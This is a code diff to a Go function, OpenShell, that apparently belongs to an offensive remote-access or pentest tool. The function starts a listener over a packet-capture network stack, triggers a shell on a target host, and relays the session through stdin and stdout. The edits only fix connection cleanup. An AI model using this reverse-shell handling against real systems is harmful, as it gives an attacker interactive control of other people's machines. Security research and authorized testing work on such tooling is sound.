@@ -147,14 +147,12 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	udpCfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalIP: localIP, LocalPort: uint16(srcPort), ReserveUDPPort: true}
 	serverCfg := pcapnet.ServerConfig{VirtualIP: virtualIP, AddressPool: pool, MTU: 1200, MaxPeers: 1}
 
-	var listener *pcapnet.TCPServer
-	listener, err = pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, srcPort)
+	listener, err := pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, srcPort)
 	if err != nil {
 		return fmt.Errorf("opening shell listener: %w", err)
 	}
 	defer listener.Close()
 	// ========= PCAP TCP STACK ==========
-	defer listener.Close()
 
 	portStr := strconv.Itoa(srcPort)
 	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, portStr, shellType); err != nil {
@@ -223,12 +221,15 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		}
 	}()
 
+	// Remote → stdout. Close the conn when done to unblock stdin → remote.
 	go func() {
 		_, _ = io.Copy(os.Stdout, conn)
 		fmt.Print("\r\n[-] Target disconnected.\r\n")
+		conn.Close()
 		close(disconnected)
 	}()
 
+	// Stdin → remote. Unblocks when conn is closed above.
 	go func() {
 		_, _ = io.Copy(conn, os.Stdin)
 	}()
